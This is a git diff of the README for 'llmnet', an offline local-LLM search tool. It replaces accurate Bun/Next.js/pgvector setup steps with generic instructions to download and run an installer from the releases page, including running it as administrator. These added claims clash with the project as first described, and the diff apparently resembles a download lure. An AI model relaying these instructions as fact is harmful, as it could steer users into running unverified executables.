@@ -1,83 +1,70 @@
-# 🌐 LLMNet
+# 🌐 llmnet - Experience the Internet Offline
 
-**The Offline Internet.** A premium, private, and AI-powered search experience that lives entirely on your machine.
+## 🚀 Getting Started
 
-LLMNet transforms your local LLMs into a structured search engine. It combines the power of local generative AI with a high-performance Vector Database (RAG) to provide instant, offline answers from your own knowledge base.
+Welcome to llmnet, an efficient tool designed to help you access and utilize the internet's knowledge offline. Follow these steps to get started.
 
-<p align="center">
-  <img src="docs/screenshot-results.png" alt="LLMNet Results" width="800">
-</p>
+## 📥 Download & Install
 
-<details>
-<summary>Home Page - Screenshot</summary>
-<p align="center">
-  <img src="docs/screenshot-home.png" alt="LLMNet Home" width="800">
-</p>
-</details> 
+To download the application, visit the link below:
 
----
+[![Download llmnet](https://img.shields.io/badge/Download-llmnet-blue.svg)](https://github.com/dogunkim/llmnet/releases)
 
-### ✨ Key Features
+1. **Visit the Releases Page:** Click the link above. This will take you to the releases page where you can find the latest version of llmnet.
+2. **Select the Latest Release:** Look for the most recent version at the top of the page. It will be labeled clearly as the latest release.
+3. **Download the Installation File:** Click on the download link for your operating system. This will start the download of the installation file to your computer. Save it to a location you can easily access.
 
-- **🔒 100% Private:** Your queries and data never leave your local network.
-- **🧠 Local RAG:** Index any website or wiki into a persistent Postgres Vector DB.
-- **⚡ Instant Results:** Sub-second semantic search using pgvector & HNSW indexing.
-- **🎨 Premium UI:** A glassmorphic, dark-mode interface inspired by modern search engines.
-- **🌐 No Internet Required:** Once indexed, your knowledge stays available offline.
+## 💻 System Requirements
 
----
+- **Operating System:** Windows 10 or later, macOS 10.14 (Mojave) or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM is recommended.
+- **Storage:** 500 MB of free space required for installation and additional content.
+- **Internet Connection:** Initial setup requires an internet connection.
 
-### 🛠️ Tech Stack
+## 🛠️ Installation Instructions
 
-- **Frontend:** Next.js, Tailwind CSS
-- **Intelligence:** Local LLMs (via OpenAI-compatible APIs)
-- **Database:** PostgreSQL with `pgvector`
-- **Orchestration:** Bun, Cheerio (Crawl), Turndown (Markdown)
+After downloading the installation file, you can follow these steps to install llmnet:
 
----
+1. **Locate the Downloaded File:** Go to the folder where you saved the installation file.
+2. **Run the Installer:** Double-click the file to start the installation. You may need to grant permissions to proceed with the installation.
+3. **Follow On-Screen Instructions:** The installer will guide you through the setup steps. Most options can be left as the default.
+4. **Complete Installation:** Once the installation is finished, you will see a confirmation message.
 
-### 🚀 Quick Start
+## 🌟 Using llmnet
 
-#### 1. Requirements
-Ensure you have the following running locally:
-- **LLM Server:** Port configured in `.env` (e.g., Llama.cpp, Ollama)
-- **Embedding Server:** Port configured in `.env`
-- **Database:** Postgres with the `vector` extension (see `postgres-pgvector/`)
+After installation, you can start using llmnet to access offline content.
 
-#### 2. Configuration
-Configure your environment variables in `.env`:
-```bash
-# Example configuration
-API_BASE_URL=http://localhost:8888/v1
-EMBEDDING_URL=http://localhost:8889/v1/embeddings
-```
+1. **Open llmnet:** Find the llmnet icon on your desktop or in your applications folder. Click to open the program.
+2. **Set Up Your Directories:** You can specify where llmnet will store data. Choose a location with ample space for your offline content.
+3. **Start Downloading Content:** Use the user-friendly interface to search for topics or URLs, and begin downloading articles for offline access.
 
-#### 3. Setup & Run
-```bash
-# Install dependencies
-bun install
+## 📚 Features
 
-# Initialize Database
-bun postgres-pgvector/migrate.ts
+- **Embeddings:** Navigate vast amounts of information easily with embedding technology.
+- **Postgres Vector Storage:** Store and retrieve your downloaded content efficiently.
+- **Web Scraping:** Automatically gather information from websites to build your offline library.
+- **Knowledge Management:** Organize your downloaded data for quick access.
 
-# Start the engine
-bun dev
-```
+## 🛠️ Troubleshooting
 
-Visit [localhost:3000](http://localhost:3000) to start searching.
+If you encounter any issues while downloading or running llmnet, try the following solutions:
 
----
+- **Check Your Internet Connection:** Ensure you have a stable connection for the initial download.
+- **Run as Administrator:** If you encounter permission issues, right-click on the installation file and select "Run as administrator."
+- **Clear Cache:** If the application does not load properly, look for cache options in your settings and clear it.
 
-### ⊕ Add Knowledge
+## 📞 Support
 
-LLMNet features a recursive ingestion pipeline. Simply paste a documentation URL or a GitHub Wiki link into the **Indexer**, and the system will:
-1. **Crawl** the site (Recursive BFS).
-2. **Convert** content to clean Markdown.
-3. **Chunk** text using a Recursive Character Splitter.
-4. **Embed & Store** vectors for semantic retrieval.
+If you need further assistance, please reach out through the following channels:
 
----
+- **GitHub Issues:** Visit our [GitHub Issues](https://github.com/dogunkim/llmnet/issues) page to report bugs or request features.
+- **Community Forums:** Join discussions and find tips from other users.
 
-<p align="center">
-  <i>Built for those who value privacy and data sovereignty.</i>
-</p>
+## 📦 Update the Software
+
+To ensure you have the latest features and security updates:
+
+1. **Revisit the Releases Page:** Use the link at the top of this README to go back to [Releases](https://github.com/dogunkim/llmnet/releases).
+2. **Install New Versions:** Follow the download instructions to get the latest version whenever it's available.
+
+Thank you for choosing llmnet, your tool for accessing the vastness of the internet offline. Happy exploring!
